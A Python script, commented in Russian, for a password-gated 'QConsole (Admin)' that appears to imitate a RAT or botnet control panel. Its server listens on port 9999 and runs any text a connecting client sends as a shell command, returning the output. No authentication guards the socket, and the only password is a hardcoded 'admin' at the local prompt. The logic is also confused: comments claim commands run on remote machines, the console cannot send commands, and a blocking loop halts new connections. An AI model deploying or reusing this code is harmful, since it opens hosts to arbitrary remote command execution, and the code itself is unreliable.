import socket
import subprocess
import threading
import random

# Пароль для доступа к QConsole (Admin)
PASSWORD = "admin"

# Список подключенных клиентов
clients = {}

def handle_client(client_socket, client_id):
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break
            # Выполняем команду на удаленной машине
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            # Отправляем результат обратно
            client_socket.send(result.stdout.encode('utf-8'))
        except Exception as e:
            print(f"Ошибка: {e}")
            break
    client_socket.close()
    del clients[client_id]
    print(f"Клиент {client_id} отключен.")

def admin_console():
    print("Добро пожаловать в QConsole (Admin)")
    password = input("Введите пароль: ")
    if password != PASSWORD:
        print("Неверный пароль!")
        return

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print("Сервер запущен и ожидает подключений...")

    while True:
        client_socket, addr = server.accept()
        client_id = random.randint(100, 999)
        clients[client_id] = client_socket
        print(f"Новое подключение: ID: {client_id}, IP: {addr[0]}")
        threading.Thread(target=handle_client, args=(client_socket, client_id)).start()

        # Отображение списка подключенных клиентов
        print("Подключенные клиенты:")
        for cid, csock in clients.items():
            print(f"ID: {cid}, IP: {csock.getpeername()[0]}")

        # Обработка команд администратора
        while True:
            cmd = input("QShell> ")
            if cmd == "help":
                print("Доступные команды: help, delete <id>, redid <old_id> <new_id>")
            elif cmd.startswith("delete"):
                _, cid = cmd.split()
                cid = int(cid)
                if cid in clients:
                    clients[cid].close()
                    del clients[cid]
                    print(f"Клиент {cid} удален.")
                else:
                    print(f"Клиент с ID {cid} не найден.")
            elif cmd.startswith("redid"):
                _, old_id, new_id = cmd.split()
                old_id = int(old_id)
                new_id = int(new_id)
                if old_id in clients:
                    clients[new_id] = clients.pop(old_id)
                    print(f"ID изменен с {old_id} на {new_id}.")
                else:
                    print(f"Клиент с ID {old_id} не найден.")
            else:
                print("Неизвестная команда. Введите 'help' для списка команд.")

if __name__ == "__main__":
    admin_console()